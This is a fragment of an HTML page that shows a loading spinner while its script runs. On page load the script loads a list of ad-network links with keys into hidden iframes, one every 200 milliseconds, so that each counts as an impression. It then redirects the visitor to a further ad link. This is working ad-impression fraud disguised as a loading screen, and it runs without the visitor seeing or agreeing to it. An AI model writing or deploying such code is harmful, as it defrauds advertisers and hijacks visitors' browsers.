    .spinner {
      border: 8px solid #f3f3f3;

      border-radius: 50%;
      width: 80px;
      height: 80px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

      color: #444;
    }

<body>
  <div class="spinner"></div>

    const adLinks = [
      "https://www.profitableratecpm.com/jxpuhxjrz0?key=fa1150763bc06ca02fe71127d3fc401a",
      "https://www.profitableratecpm.com/azvesgzec8?key=3d814bb167052d41de0c9ca24198ac95",

      "https://www.profitableratecpm.com/yndczp29mg?key=a74f359835937bac91f7bf7fa87223c3"
    ];

    const redirectURL = "https://www.profitableratecpm.com/fbm6e1jc?key=668bcbd96605100ae51b50d8c5a33f4f";

    let index = 0;

    function fireImpression(link) {
      const iframe = document.createElement("iframe");
      iframe.src = link;
      iframe.style.display = "none";
      document.body.appendChild(iframe);
    }

    function loadAds() {
      if (index < adLinks.length) {
        fireImpression(adLinks[index]);
        index++;
        setTimeout(loadAds, 200);
      } else {
        setTimeout(() => {
          window.location.href = redirectURL;
        }, 1000);
      }
    }

    window.onload = loadAds;
  </script>
